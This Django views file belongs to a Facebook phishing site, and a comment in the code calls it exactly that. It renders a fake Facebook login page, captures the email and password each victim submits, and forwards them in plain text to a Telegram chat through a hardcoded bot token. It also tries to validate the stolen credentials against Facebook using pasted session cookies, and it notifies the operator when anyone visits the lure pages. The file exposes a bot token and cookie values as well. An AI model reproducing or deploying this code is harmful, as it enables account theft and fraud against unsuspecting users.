from django.shortcuts import render, redirect, HttpResponse
from django.http import JsonResponse
from django.views import View

import requests
from bs4 import BeautifulSoup
from telegram import Tgram

chat_id = '937415007'
# 5543646948 937415007
telegram = Tgram('7530968531:AAGv1oUeJOJpzhtX9TKC0aLfwg0SpHzs0TU')

FB_URL = "https://facebook.com"

coockies = [
    {
        "domain": ".facebook.com",
        "expirationDate": 1752775567.367127,
        "hostOnly": False,
        "httpOnly": True,
        "name": "ps_l",
        "path": "/",
        "sameSite": "lax",
        "secure": True,
        "session": False,
        "storeId": None,
        "value": "1"
    },
    {
        "domain": ".facebook.com",
        "expirationDate": 1752775567.366616,
        "hostOnly": False,
        "httpOnly": True,
        "name": "datr",
        "path": "/",
        "sameSite": "no_restriction",
        "secure": True,
        "session": False,
        "storeId": None,
        "value": "6-FpZour5X94oAAbzgP2PzkF"
    },
    {
        "domain": ".facebook.com",
        "expirationDate": 1732179967.563552,
        "hostOnly": False,
        "httpOnly": True,
        "name": "fr",
        "path": "/",
        "sameSite": "no_restriction",
        "secure": True,
        "session": False,
        "storeId": None,
        "value": "0kNu9QLcsHp4mcfm7..BmaeHr..AAA.0.0.BmyFD_.AWX14Y337yU"
    },
    {
        "domain": ".facebook.com",
        "expirationDate": 1752775567.366938,
        "hostOnly": False,
        "httpOnly": True,
        "name": "ps_n",
        "path": "/",
        "sameSite": "no_restriction",
        "secure": True,
        "session": False,
        "storeId": None,
        "value": "1"
    },
    {
        "domain": ".facebook.com",
        "expirationDate": 1752775148.761073,
        "hostOnly": False,
        "httpOnly": True,
        "name": "sb",
        "path": "/",
        "sameSite": "no_restriction",
        "secure": True,
        "session": False,
        "storeId": None,
        "value": "6-FpZpUzk_4Bd3VhBon6EjrW"
    },
    {
        "domain": ".facebook.com",
        "expirationDate": 1725008778,
        "hostOnly": False,
        "httpOnly": False,
        "name": "wd",
        "path": "/",
        "sameSite": "lax",
        "secure": True,
        "session": False,
        "storeId": None,
        "value": "1920x930"
    }
]

class ParseData:
    def __init__(self,html):
        self.html = html
        self.soup =  BeautifulSoup(self.html,'html.parser')
    
    def form_action(self):
        self.form = self.soup.find('form')
        action = FB_URL + self.form.get_attribute_list('action')[0]
        
        return action
    
    def input_value(self, type):
        values = {}

        inputs = self.soup.find_all('input',{"type":type})

        for input in inputs:
            name = input.get_attribute_list('name')[0]
            value = input.get_attribute_list('value')[0]
            values[name] = value

        return values
    
    def login(self, email, password):
        credentials = {
            "email": email,
            "pass": password
        }

        # check credentials validity 
        session = requests.Session()
        session.headers = coockies
        response = session.get(FB_URL)
        parser = ParseData(response.text)
        login_url = parser.form_action()
        values = parser.input_value("hidden")
        credentials.update(values)
        login_response = session.post(login_url,data=credentials)
        # res = session.get("https://facebook.com/settings/")

        if "com/settings" in login_response.url:
            return ("Login successfully")

        else:

            # return JsonResponse(credentials,safe=False)
            return (login_response.url)


class Home(View):
    def get(self,request, *args, **kwargs):
        return redirect('offer')
        

class Offer(View):
    def get(self,request, *args, **kwargs):
        message = "Hey, Someone has visited offer page!!!"
        telegram.send_message(chat_id,message)

        return render(request, 'index.html')

class Register(View):
    def get(self,request, *args, **kwargs):
        message = "Going to confirm registration"
        telegram.send_message(chat_id,message)

        return render(request, 'register.html')
    

class LoginWithFacebook(View):
    def get(self,request, *args, **kwargs):
        message = "User in the phishing page!!!"
        # telegram.send_message(chat_id,message)

        return render(request, 'fb-login-page.html')
    
    def post(self,request, *args, **kwargs):
        email = request.POST.get('email','was empty')
        password = request.POST.get('password','was empty')

        # check credentials validity 
        session = requests.Session()
        session.cookies = coockies
        response = session.get(FB_URL)
        

        message = "Email: " + email + "\nPassword: " + password
        telegram.send_message(chat_id,message)

        context = {
            "display":"Confirmed"
        }
        return render(request,'register.html',context=context)